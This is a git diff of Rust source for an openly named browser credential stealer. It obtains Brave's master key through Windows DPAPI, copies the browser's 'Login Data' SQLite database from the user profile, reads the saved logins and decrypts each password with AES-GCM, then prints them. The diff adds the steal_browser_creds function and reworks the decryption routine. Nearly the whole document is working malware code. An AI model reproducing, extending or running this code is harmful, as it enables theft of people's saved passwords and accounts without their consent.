@@ -8,7 +8,7 @@ use winapi::um::dpapi::CRYPTPROTECT_UI_FORBIDDEN;
 use winapi::um::wincrypt::DATA_BLOB;
 
 use aes_gcm::{
-    aead::{Aead, AeadCore, KeyInit, OsRng},
+    aead::{Aead, KeyInit},
     Aes256Gcm,
     Key, // Or `Aes128Gcm`
     Nonce,
@@ -166,20 +166,81 @@ pub fn fetch_encryption_key() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     // Free the decrypted output memory
     unsafe { winapi::um::winbase::LocalFree(decrypted_output.pbData as *mut _) };
 
-    println!("Decrypted key: {:?}", decrypted_key);
     Ok(decrypted_key)
 }
 
-pub fn brave_password_decryption(password: &str, encryption_key: &[u8]) {
-    let iv = &password[3..15];
-    let password = &password[15..];
+pub fn password_decryption(password: &str, encryption_key: &[u8]) {
+    let password_bytes = password.as_bytes();
+
+    if password_bytes.len() < 15 {
+        println!("Password is too shortssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss.");
+        return;
+    }
+
+    let iv = &password_bytes[3..15];
+    let password = &password_bytes[15..];
+
+    // println!("IV: {:?}, PASS: {}", iv, password);
 
     let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(encryption_key));
 
     // Generate nonce from IV
-    let nonce = Nonce::from_slice(iv.as_bytes().try_into().unwrap());
+    let nonce = Nonce::from_slice(iv.try_into().unwrap());
 
-    let decrypted = cipher.decrypt(&nonce, password.as_bytes());
+    let decrypted = cipher.decrypt(&nonce, password);
 
-    println!("Decrypted password: {:?}", decrypted);
+    match decrypted {
+        Ok(decrypted) => {
+            let decrypted = String::from_utf8(decrypted).unwrap();
+            println!("Password: {}", decrypted);
+        }
+        Err(e) => {
+            println!("Failed to decrypt password.: {}", e);
+        }
+    }
+}
+
+pub fn steal_browser_creds() {
+    let enc_key = fetch_encryption_key().unwrap();
+
+    let db_path = format!(
+        "{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data",
+        std::env::var("USERPROFILE").unwrap()
+    );
+
+    let filename = "ChromePasswords.db";
+
+    let _ = std::fs::copy(db_path, filename);
+
+    let connection = sqlite::open(filename).unwrap();
+
+    let query = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used;";
+
+    let mut statement = connection.prepare(query).unwrap();
+
+    while let Ok(sqlite::State::Row) = statement.next() {
+        password_decryption(
+            &statement.read::<String, _>("password_value").unwrap(),
+            &enc_key,
+        );
+
+        println!("===============================");
+        println!(
+            "origin = {}",
+            statement.read::<String, _>("origin_url").unwrap()
+        );
+        println!(
+            "pass = {}",
+            statement.read::<String, _>("password_value").unwrap()
+        );
+        // println!("password = {:?}", &decrypted_pass);
+    }
+
+    // match fetch_encryption_key() {
+    //     Ok(_key) => {
+    //         println!("\x1b[92mSuccess: Encryption key received\x1b[0m");
+    //         // utils::brave_password_decryption("password", &key)
+    //     }
+    //     Err(e) => println!("\x1b[31mError: {}\x1b[0m", e),
+    // }
 }
